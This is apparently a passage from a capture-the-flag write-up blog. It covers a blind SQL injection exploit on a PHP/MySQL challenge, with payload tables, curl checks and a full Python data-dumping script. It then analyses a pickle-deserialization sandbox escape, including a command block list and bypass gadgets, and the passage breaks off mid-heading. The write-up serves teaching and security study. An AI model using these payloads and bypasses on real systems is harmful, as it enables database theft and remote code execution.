class="keyword">echo</span> <span class="string">&#x27;ill try to tell him, dw&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h3><ol><li><strong>Raw SQL injection</strong> on <code>id</code>, with no sanitization and no parameterization.</li><li><strong>A deliberate 2-second floor</strong> via <code>register_shutdown_function</code>. Every response takes at least 2.0s, and the comment <code>// no timing attack!!</code> confirms it’s intentional.</li><li><strong>The output is always the same string.</strong> <code>$row</code> is fetched but never printed, so UNION-based output is useless.</li><li><strong><code>mysqli_report(MYSQLI_REPORT_OFF)</code></strong> hides MySQL errors.</li></ol><h3 id="The-subtle-bug"><a href="#The-subtle-bug" class="headerlink" title="The subtle bug"></a>The subtle bug</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);   <span class="comment">// mysqli_result | TRUE | FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; <span class="keyword">die</span>(...); &#125;   <span class="comment">// FALSE → die</span></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();  <span class="comment">// TRUE → FATAL ERROR</span></span><br></pre></td></tr></table></figure><p><code>mysqli::query()</code> returns <strong>three different types</strong>:</p><table><thead><tr><th>Query type</th><th>Return</th></tr></thead><tbody><tr><td><code>SELECT</code>, <code>SHOW</code>, <code>DESCRIBE</code>, <code>EXPLAIN</code></td><td><code>mysqli_result</code> object</td></tr><tr><td><code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, <code>SELECT ... INTO @var</code>, <code>SELECT ... INTO OUTFILE</code></td><td><code>TRUE</code> (boolean)</td></tr><tr><td>Error</td><td><code>FALSE</code></td></tr></tbody></table><p>When it returns <code>TRUE</code>, the next line executes <code>TRUE-&gt;fetch_row()</code>, which is a fatal PHP error:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught Error: Call to a member function fetch_row() on bool</span><br></pre></td></tr></table></figure><p><strong>That fatal error changes the response body.</strong> This is our oracle.</p><h2 id="2-The-dead-ends"><a href="#2-The-dead-ends" class="headerlink" title="2. The dead ends"></a>2. The dead ends</h2><p>Before finding the oracle, everything classic fails:</p><table><thead><tr><th>Payload</th><th>Result</th><th>Why</th></tr></thead><tbody><tr><td><code>id=1 OR SLEEP(5)</code></td><td>2.4s</td><td><code>users</code> empty → <code>WHERE</code> not evaluated</td></tr><tr><td><code>id=(SELECT SLEEP(5))</code></td><td>2.4s</td><td>Same reason</td></tr><tr><td><code>id=1 UNION SELECT SLEEP(5)--</code></td><td>2.4s</td><td><code>--</code> needs a trailing space, and column count must match</td></tr><tr><td><code>BENCHMARK(3000000000, MD5(1))</code></td><td>2.4s</td><td>Query never executed</td></tr><tr><td><code>INTO OUTFILE &#39;/var/www/html/x&#39;</code></td><td>404</td><td>No <code>FILE</code> privilege &#x2F; <code>secure_file_priv</code> block</td></tr><tr><td><code>LOAD_FILE(&#39;\\\\...oast.fun\\a&#39;)</code></td><td>No DNS hit</td><td>No <code>FILE</code> privilege</td></tr><tr><td>sqlmap</td><td>30+ min, no hit</td><td>2s shutdown sleep defeats its statistical model</td></tr></tbody></table><p>Everything returned byte-identical output. All timing and out-of-band channels were dead.</p><h2 id="3-The-breakthrough"><a href="#3-The-breakthrough" class="headerlink" title="3. The breakthrough"></a>3. The breakthrough</h2><p>Force <code>query()</code> to return <code>TRUE</code> using <strong><code>SELECT ... INTO @var</code></strong>, a valid MySQL clause that produces no result set but needs no file privileges:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 INTO @x</span><br></pre></td></tr></table></figure><p>The full query becomes:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">INTO</span> <span class="variable">@x</span></span><br></pre></td></tr></table></figure><p>MySQL accepts this, returns no result set, PHP’s <code>mysqli::query()</code> returns <code>TRUE</code>, and line 14 crashes with a fatal error.</p><p>Verified:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://.../?id=1%20INTO%20@x&quot;</span> | grep -o <span class="string">&quot;Fatal error&quot;</span></span><br><span class="line"><span class="comment"># → Fatal error</span></span><br></pre></td></tr></table></figure><p>We now have a way to detect “query succeeded without a result set”.</p><h2 id="4-Turning-it-into-a-boolean-oracle"><a href="#4-Turning-it-into-a-boolean-oracle" class="headerlink" title="4. Turning it into a boolean oracle"></a>4. Turning it into a boolean oracle</h2><p>We need to make the crash <strong>conditional</strong>. The naive form:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">AND</span> IF(<span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>, <span class="number">1</span>, (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> nonexistent)) <span class="keyword">INTO</span> <span class="variable">@x</span></span><br></pre></td></tr></table></figure><p>fails, because <strong>MySQL parses both branches of <code>IF</code> at parse time</strong>. Any invalid table reference in either branch breaks the query before the condition is ever evaluated.</p><p>The fix is to use an error that happens at <strong>runtime</strong>, only in the branch actually taken. The classic primitive is numeric overflow:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">AND</span> IF(<span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>, <span class="number">1</span>, <span class="built_in">EXP</span>(<span class="number">99999</span>)) <span class="keyword">INTO</span> <span class="variable">@x</span></span><br></pre></td></tr></table></figure><ul><li>Condition <strong>TRUE</strong> → <code>IF</code> returns <code>1</code> → query succeeds → <code>query()</code> &#x3D; <code>TRUE</code> → PHP fatally crashes → response contains <code>Fatal error</code>.</li><li>Condition <strong>FALSE</strong> → <code>IF</code> returns <code>EXP(99999)</code> → double overflow error → query fails → <code>$res = FALSE</code> → <code>die(&quot;ill try to tell him, dw&quot;)</code> → normal response.</li></ul><h3 id="The-oracle"><a href="#The-oracle" class="headerlink" title="The oracle"></a>The oracle</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error in response  ⇔  condition is TRUE</span><br></pre></td></tr></table></figure><p>Verified end to end:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;.../?id=1%20AND%20IF(1=1,1,EXP(99999))%20INTO%20@x&quot;</span> | grep -c <span class="string">&quot;Fatal error&quot;</span>   <span class="comment"># → 1</span></span><br><span class="line">curl -s <span class="string">&quot;.../?id=1%20AND%20IF(1=2,1,EXP(99999))%20INTO%20@x&quot;</span> | grep -c <span class="string">&quot;Fatal error&quot;</span>   <span class="comment"># → 0</span></span><br></pre></td></tr></table></figure><p>One trap worth flagging: <code>UNION ... INTO @x</code> is <strong>invalid MySQL</strong>. <code>INTO</code> can only attach to the last <code>SELECT</code> of the top-level query, never after a <code>UNION</code>. That’s why the union variant returned 0 for both true and false, which cost me a while before I noticed. Always use the <code>AND</code> form.</p><h2 id="5-Extracting-data"><a href="#5-Extracting-data" class="headerlink" title="5. Extracting data"></a>5. Extracting data</h2><p>Two optimizations make extraction practical given the forced 2s delay.</p><p><strong>Binary search instead of linear scan.</strong> Naive scanning tries ASCII 32, 33, 34, and so on, up to 95 requests per character. Splitting 0 to 255 in half each time gets it to roughly 8 requests per character.</p><p><strong><code>GROUP_CONCAT</code> batching.</strong> Instead of one extraction per table name, pull them all in one SQL string:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(table_name SEPARATOR <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">FROM</span> information_schema.tables</span><br><span class="line"><span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;chall&#x27;</span></span><br></pre></td></tr></table></figure><p>Same for columns, and rows via <code>CONCAT_WS(&#39;|&#39;, col1, col2, ...)</code>. This collapses dozens of extractions into one.</p><h2 id="6-The-final-Python-script"><a href="#6-The-final-Python-script" class="headerlink" title="6. The final Python script"></a>6. The final Python script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://65d7587f7ad9145d.chal.ctf.ae/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">cond</span>):</span><br><span class="line">    payload = <span class="string">f&quot;1 AND IF(<span class="subst">&#123;cond&#125;</span>,1,EXP(99999)) INTO @x&quot;</span></span><br><span class="line">    r = requests.get(URL, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Fatal error&quot;</span> <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_len</span>(<span class="params">query</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> oracle(<span class="string">f&quot;LENGTH((<span class="subst">&#123;query&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span>):</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> lo</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_char</span>(<span class="params">query, pos</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> oracle(<span class="string">f&quot;ORD(SUBSTRING((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span>):</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(lo) <span class="keyword">if</span> <span class="number">32</span> &lt;= lo &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&quot;\\x<span class="subst">&#123;lo:02x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">query</span>):</span><br><span class="line">    n = get_len(query)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        out += get_char(query, i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;n&#125;</span>] <span class="subst">&#123;out&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Fetching all table names in `chall`...&quot;</span>)</span><br><span class="line">tables_str = extract(</span><br><span class="line">    <span class="string">&quot;SELECT GROUP_CONCAT(table_name SEPARATOR &#x27;,&#x27;) &quot;</span></span><br><span class="line">    <span class="string">&quot;FROM information_schema.tables WHERE table_schema=&#x27;chall&#x27;&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Tables: <span class="subst">&#123;tables_str&#125;</span>&quot;</span>)</span><br><span class="line">tables = tables_str.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tables:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n=== Table: <span class="subst">&#123;t&#125;</span> ===&quot;</span>)</span><br><span class="line">    cols_str = extract(</span><br><span class="line">        <span class="string">f&quot;SELECT GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;) &quot;</span></span><br><span class="line">        <span class="string">f&quot;FROM information_schema.columns &quot;</span></span><br><span class="line">        <span class="string">f&quot;WHERE table_schema=&#x27;chall&#x27; AND table_name=&#x27;<span class="subst">&#123;t&#125;</span>&#x27;&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Columns: <span class="subst">&#123;cols_str&#125;</span>&quot;</span>)</span><br><span class="line">    cols = cols_str.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line">    row_expr = <span class="string">&quot;CONCAT_WS(&#x27;|&#x27;,&quot;</span> + <span class="string">&quot;,&quot;</span>.join(cols) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        val = extract(<span class="string">f&quot;SELECT <span class="subst">&#123;row_expr&#125;</span> FROM <span class="subst">&#123;t&#125;</span> LIMIT <span class="subst">&#123;i&#125;</span>,1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Row <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;val&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Done.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="How-it-works"><a href="#How-it-works" class="headerlink" title="How it works"></a>How it works</h3><ol><li><code>oracle(cond)</code> sends the conditional <code>INTO @x</code> payload and checks the response for <code>Fatal error</code>.</li><li><code>get_len(query)</code> binary searches on <code>LENGTH()</code>.</li><li><code>get_char(query, pos)</code> binary searches on <code>ORD(SUBSTRING(..., pos, 1))</code>.</li><li><code>extract(query)</code> walks the string one character at a time.</li><li>Enumeration lists all tables in <code>chall</code>, then all columns of each, then dumps up to 10 rows per table via <code>GROUP_CONCAT</code>.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install requests</span><br><span class="line">python3 extract.py</span><br></pre></td></tr></table></figure><p>The flag lands in one of the dumped rows, usually in a <code>flag</code> table’s <code>value</code> column or in <code>users.password</code>.</p><h2 id="7-Summary-of-the-exploit-chain"><a href="#7-Summary-of-the-exploit-chain" class="headerlink" title="7. Summary of the exploit chain"></a>7. Summary of the exploit chain</h2><ol><li><strong>Spot the type confusion.</strong> <code>$res-&gt;fetch_row()</code> on a boolean crashes PHP.</li><li><strong>Trigger <code>TRUE</code> deterministically</strong> with <code>SELECT ... INTO @x</code>.</li><li><strong>Make it conditional</strong> with <code>IF(cond, 1, EXP(99999))</code>, a runtime error rather than a parse error.</li><li><strong>Build a boolean oracle</strong> on the presence of <code>Fatal error</code> in the response.</li><li><strong>Extract with binary search and <code>GROUP_CONCAT</code></strong> to defeat the 2-second floor.</li></ol><p>The 2-second shutdown sleep and its <code>// no timing attack!!</code> comment were the intended red herring. The real vulnerability is the type confusion between <code>mysqli_result</code> and <code>TRUE</code> at line 14, which hands you a boolean side channel that the timing lock does nothing to stop.</p><h2 id="8-Key-takeaways"><a href="#8-Key-takeaways" class="headerlink" title="8. Key takeaways"></a>8. Key takeaways</h2><ul><li><strong><code>mysqli::query()</code> has three return types</strong>, and checking only <code>if (!$res)</code> is not enough. Any code that assumes <code>mysqli_result</code> after that check is broken.</li><li><strong>Runtime errors beat parse errors</strong> for conditional blind SQLi. <code>EXP(99999)</code>, <code>1/0</code>, <code>CAST(... AS UNSIGNED)</code> and <code>UPDATEXML()</code> all error at evaluation time and are safe on the branch that isn’t taken.</li><li><strong><code>INTO @var</code></strong> is a privilege-free way to force a non-result-set return.</li><li><strong><code>GROUP_CONCAT</code> plus binary search</strong> is the standard way to make boolean blind SQLi bearable over slow links.</li><li>When every classic channel is dead, look for the bug in the PHP itself, not the SQL.</li></ul><hr><h1 id="Challenge-2-Time-Capsule-Pickle-Sandbox-Escape"><a href="#Challenge-2-Time-Capsule-Pickle-Sandbox-Escape" class="headerlink" title="Challenge 2: Time Capsule (Pickle Sandbox Escape)"></a>Challenge 2: Time Capsule (Pickle Sandbox Escape)</h1><blockquote><p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>Category</strong>: <span style="color:#9fef00">Web</span></p></blockquote><h2 id="Challenge-summary"><a href="#Challenge-summary" class="headerlink" title="Challenge summary"></a>Challenge summary</h2><p>A Flask web app called “Time Capsule” accepts a base64-encoded Python pickle, runs it through a hardened restricted unpickler, and executes whatever it decodes to. Three independent layers of defense stand between the payload and code execution. The goal is to read <code>/app/flag.txt</code> on the server.</p><h2 id="Challenge-statement"><a href="#Challenge-statement" class="headerlink" title="Challenge statement"></a>Challenge statement</h2><p>The challenge ships six files: a <code>Dockerfile</code>, <code>docker-compose.yml</code>, <code>webapp.py</code>, <code>sessionstore.py</code>, <code>app.js</code> and <code>index.html</code>. The app exposes a single endpoint:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restore</span><br><span class="line">Body: &#123;&quot;payload&quot;: &quot;&lt;base64&gt;&quot;&#125;</span><br></pre></td></tr></table></figure><p>The server base64-decodes the payload, runs it through a filter, then deserializes it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">BANNED_PATTERNS = [</span><br><span class="line">    <span class="string">b&quot;.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;system&quot;</span>, <span class="string">b&quot;popen&quot;</span>, <span class="string">b&quot;subprocess&quot;</span>, <span class="string">b&quot;commands&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;exec&quot;</span>, <span class="string">b&quot;eval&quot;</span>, <span class="string">b&quot;import&quot;</span>, <span class="string">b&quot;getattr&quot;</span>, <span class="string">b&quot;setattr&quot;</span>, <span class="string">b&quot;flag&quot;</span></span><br><span class="line">]</span><br><span class="line">BANNED_INSTRUCTION = <span class="string">&quot;REDUCE&quot;</span></span><br><span class="line">ALLOWED_MODULES = &#123;<span class="string">&quot;sessionstore&quot;</span>, <span class="string">&quot;collections&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_MODULES:</span><br><span class="line">            <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;module %r is not allowed&quot;</span> % module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().find_class(module, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> BANNED_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Payload contains banned characters!&quot;</span>)</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pickletools.dis(data, out=out)</span><br><span class="line">        disassembled = out.getvalue()</span><br><span class="line">        <span class="keyword">if</span> BANNED_INSTRUCTION <span class="keyword">in</span> disassembled:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Payload contains banned instruction: %s&quot;</span> % BANNED_INSTRUCTION)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        disassembled = <span class="string">&quot;Error!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> disassembled</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore</span>(<span class="params">raw_b64</span>):</span><br><span class="line">    data = base64.b64decode(raw_b64)</span><br><span class="line">    disassembled = check(data)</span><br><span class="line">    buf = io.StringIO()</span><br><span class="line">    <span class="keyword">with</span> contextlib.redirect_stdout(buf):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            RestrictedUnpickler(io.BytesIO(data)).load()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), disassembled</span><br></pre></td></tr></table></figure><p>Docker confirms Python 3.12 and the flag location:</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.12</span>-slim</span><br><span class="line">...</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=root:root flag.txt /app/flag.txt</span></span><br></pre></td></tr></table></figure><h2 id="The-three-defenses"><a href="#The-three-defenses" class="headerlink" title="The three defenses"></a>The three defenses</h2><p><strong>Module allow-list.</strong> Only imports from <code>sessionstore</code> (the app’s own tiny helper module, with <code>Capsule</code>, <code>render</code> and <code>new_capsule</code>) or <code>collections</code> are permitted. No <code>os</code>, no <code>sys</code>, no <code>subprocess</code>.</p><p><strong><code>REDUCE</code> opcode ban.</strong> After disassembling the payload with <code>pickletools.dis</code>, if the string <code>&quot;REDUCE&quot;</code> appears anywhere in the output, the payload is rejected. <code>REDUCE</code> is the opcode the textbook pickle exploit relies on: <code>GLOBAL</code> a dangerous callable, push args, <code>REDUCE</code> to call it.</p><p><strong>Raw-byte substring filter.</strong> The <em>undecoded</em> pickle bytes are scanned for <code>os</code>, <code>system</code>, <code>subprocess</code>, <code>import</code>, <code>getattr</code>, <code>setattr</code>, <code>flag</code> and friends. Notably, <code>.</code> (a bare period) is banned outright.</p><h2 id="How-we-got-there"><a href="#How-we-got-there" class="headerlink" title="How we got there"></a>How we got there</h2><p><strong>Pickle isn’t just data, it’s a tiny stack VM.</strong> Deserializing a pickle means executing a stream of opcodes: <code>GLOBAL</code> resolves <code>module.name</code>, various opcodes build containers, and normally <code>REDUCE</code> calls a function with arguments. That’s what makes pickle deserialization dangerous, and it’s what this challenge partially blocks.</p><p><strong><code>REDUCE</code> isn’t the only opcode that calls something.</strong> Pickle protocol 0 has an older opcode, <code>OBJ</code>, whose handler in <code>pickle.py</code> does roughly this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">args = pop_mark()      <span class="comment"># everything since the last MARK</span></span><br><span class="line">cls = args.pop(<span class="number">0</span>)      <span class="comment"># first item = the &quot;callable&quot;</span></span><br><span class="line"><span class="keyword">return</span> cls(*args)      <span class="comment"># ordinary Python call</span></span><br></pre></td></tr></table></figure><p>I confirmed it empirically: a hand-crafted payload using <code>OBJ</code> instead of <code>REDUCE</code> disassembles with no <code>&quot;REDUCE&quot;</code> in the output, and still calls the target with arguments.</p><p><strong>Finding a gadget inside the whitelist.</strong> <code>collections</code> looks harmless, since it’s just container types, but reading its actual source with <code>inspect.getsource</code> shows two things worth exploiting:</p><ul><li><code>collections.__builtins__</code>: for any normally-imported module, Python auto-injects <code>__builtins__</code> into its namespace as <strong>the real builtins dict</strong>, not the module object. <code>GLOBAL collections __builtins__</code> hands you every builtin function by name (<code>open</code>, <code>print</code>, <code>vars</code>, <code>type</code>, <code>chr</code>, <code>str</code>, <code>len</code>, and the rest) for free.</li><li><code>collections._itemgetter</code>: <code>collections</code> imports <code>operator.itemgetter</code> as a private name at the top of the file. <code>itemgetter(key)(obj)</code> is <code>obj[key]</code> expressed as a function call instead of <code>[]</code> syntax.</li></ul><p><strong>Generic attribute access without <code>.</code> or <code>getattr</code>.</strong> The byte filter blocks the literal <code>.</code> and the word <code>getattr</code>, so no dot syntax and no <code>getattr()</code> calls anywhere. The workaround: <code>vars(obj)</code> returns <code>obj.__dict__</code> for <em>any</em> object that has one (modules, classes, instances), and that dict is subscriptable via <code>itemgetter</code>. Combined with <code>type()</code>, this gives a full reflection primitive:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vars</span>(<span class="built_in">type</span>(some_object))[<span class="string">&#x27;method_name&#x27;</span>](some_object, *args)</span><br><span class="line"><span class="comment"># equivalent to: some_object.method_name(*args)</span></span><br></pre></td></tr></table></figure><p><strong>No <code>STOP</code> opcode.</strong> <code>STOP</code>, the opcode marking end of stream, is literally the byte <code>0x2e</code>, which is <code>.</code>, which is banned. Every payload therefore has to end abruptly without it. <code>restore()</code> catches the resulting <code>EOFError</code> with a bare <code>except: pass</code>, so this costs nothing. It also has a side effect in our favor: <code>check()</code>‘s <code>pickletools.dis()</code> call raises on the truncated stream, caught by the <em>same</em> broad <code>except Exception</code>, so the <code>&quot;REDUCE&quot;</code> string search never even executes for any STOP-less payload.</p><p><strong>Building <code>/app/flag.txt</code> without the literal bytes <code>flag</code> or <code>.</code>.</strong> The filename gets assembled piece by piece at <em>runtime</em>: <code>&quot;/app/fl&quot; + &quot;ag&quot; + chr(N) + &quot;txt&quot;</code>, where <code>N</code> needs to equal 46, the ASCII code for <code>.</code>. My first attempt embedded the integer <code>46</code> directly via a <code>BININT1</code> opcode, which puts the raw byte <code>0x2e</code> straight into the payload and immediately trips the <code>.</code> filter, an actual bug I caught while testing. The fix is to compute <code>46</code> at runtime instead of writing it: concatenate two filler strings of safe lengths (20 and 26 characters) and take <code>len()</code> of the result, so the number 46 only ever exists in memory during unpickling, never as a byte I sent.</p><h2 id="Final-exploit-chain"><a href="#Final-exploit-chain" class="headerlink" title="Final exploit chain"></a>Final exploit 